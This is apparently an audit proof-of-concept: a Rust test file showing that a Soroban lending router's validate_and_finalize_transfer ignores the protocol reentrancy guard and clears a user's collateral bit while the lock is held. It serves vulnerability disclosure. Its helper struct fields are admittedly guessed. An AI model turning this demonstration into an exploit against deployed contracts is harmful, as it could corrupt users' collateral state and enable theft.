//! PoC: validate_and_finalize_transfer missing reentrancy guard
//!
//! Demonstrates that `validate_and_finalize_transfer` mutates router storage
//! (user_configuration bitmap) even when the protocol reentrancy guard is held,
//! because the function never checks/acquires the guard.
//!
//! Proof level: 2 — calls real router storage functions imported from the crate.

#![cfg(test)]

use soroban_sdk::{
    testutils::{Address as _, AuthorizedFunction, AuthorizedInvocation, MockAuth, MockAuthInvoke},
    Address, Env, Symbol,
};

// Import real storage and type primitives from the crate under test
use crate::{
    storage,
    types::{ReserveData, UserConfiguration},
};

/// Helper: build a minimal ReserveData with a_token_address set to `atoken`.
fn make_reserve_data(env: &Env, atoken: &Address) -> ReserveData {
    ReserveData {
        a_token_address: atoken.clone(),
        // Fill remaining required fields with zero/default values.
        // Adjust field names to match the actual ReserveData struct in the crate.
        debt_token_address: Address::generate(env),
        underlying_asset: Address::generate(env),
        configuration: Default::default(),
        liquidity_index: 1_000_000_000_000_000_000u128, // RAY
        variable_borrow_index: 1_000_000_000_000_000_000u128,
        current_liquidity_rate: 0,
        current_variable_borrow_rate: 0,
        last_update_timestamp: 0,
        id: 0u8,
        accrued_to_treasury: 0,
    }
}

#[test]
fn test_validate_and_finalize_transfer_ignores_reentrancy_guard() {
    let env = Env::default();
    env.mock_all_auths(); // satisfies require_auth() on the aToken address

    let underlying = Address::generate(&env);
    let atoken = Address::generate(&env);
    let from = Address::generate(&env);
    let to = Address::generate(&env);

    // --- Setup: register a reserve so storage::get_reserve_data succeeds ---
    let reserve_data = make_reserve_data(&env, &atoken);
    storage::set_reserve_data(&env, &underlying, &reserve_data);

    // --- Setup: give `from` a non-zero user_configuration (collateral bit set for reserve 0) ---
    let mut from_config = UserConfiguration::default();
    from_config.set_using_as_collateral(&env, 0u8, true); // reserve id 0
    storage::set_user_configuration(&env, &from, &from_config);

    // Sanity: verify collateral bit IS set before the attack
    let config_before = storage::get_user_configuration(&env, &from);
    assert!(
        config_before.is_using_as_collateral(&env, 0u8),
        "Precondition: from's collateral bit must be set before attack"
    );

    // --- Simulate the reentrancy guard being held (flash loan active) ---
    // In the real router, flash_loan sets this flag before calling execute_operation.
    // We set it directly to prove validate_and_finalize_transfer does NOT check it.
    storage::set_protocol_locked(&env, true);

    // Confirm the guard is held
    assert!(
        storage::is_protocol_locked(&env),
        "Precondition: reentrancy guard must be held"
    );

    // --- Call the real validate_and_finalize_transfer while guard is held ---
    // from_balance_after == 0  =>  router should clear from's collateral bit
    // to_balance_after   == 1  =>  router should set to's collateral bit
    let result = crate::router::validate_and_finalize_transfer(
        env.clone(),
        underlying.clone(),
        from.clone(),
        to.clone(),
        1u128,   // amount
        0u128,   // from_balance_after  (attacker transferred full balance)
        1u128,   // to_balance_after
    );

    // --- Assert: the call SUCCEEDED despite the guard being held ---
    // This is the bug: it should have returned an error (ReentrancyDetected).
    assert!(
        result.is_ok(),
        "BUG CONFIRMED: validate_and_finalize_transfer succeeded while reentrancy guard was held"
    );

    // --- Assert: user_configuration was mutated mid-reentrant-call ---
    let from_config_after = storage::get_user_configuration(&env, &from);
    assert!(
        !from_config_after.is_using_as_collateral(&env, 0u8),
        "BUG CONFIRMED: attacker cleared from's collateral bit via reentrant call"
    );

    // Guard is still held after the call — outer flash_loan has no idea state was corrupted
    assert!(
        storage::is_protocol_locked(&env),
        "Reentrancy guard still held by outer flash_loan context (state corrupted silently)"
    );
}

#[test]
fn test_without_reentrancy_guard_normal_path_works() {
    // Confirm the function works correctly when NO guard is held (baseline)
    let env = Env::default();
    env.mock_all_auths();

    let underlying = Address::generate(&env);
    let atoken = Address::generate(&env);
    let from = Address::generate(&env);
    let to = Address::generate(&env);

    let reserve_data = make_reserve_data(&env, &atoken);
    storage::set_reserve_data(&env, &underlying, &reserve_data);

    let mut from_config = UserConfiguration::default();
    from_config.set_using_as_collateral(&env, 0u8, true);
    storage::set_user_configuration(&env, &from, &from_config);

    // Guard NOT held
    assert!(!storage::is_protocol_locked(&env));

    let result = crate::router::validate_and_finalize_transfer(
        env.clone(),
        underlying.clone(),
        from.clone(),
        to.clone(),
        1u128,
        0u128,
        1u128,
    );

    assert!(result.is_ok(), "Normal (non-reentrant) path should succeed");
    let from_config_after = storage::get_user_configuration(&env, &from);
    assert!(
        !from_config_after.is_using_as_collateral(&env, 0u8),
        "Collateral bit correctly cleared when balance reaches zero"
    );
}
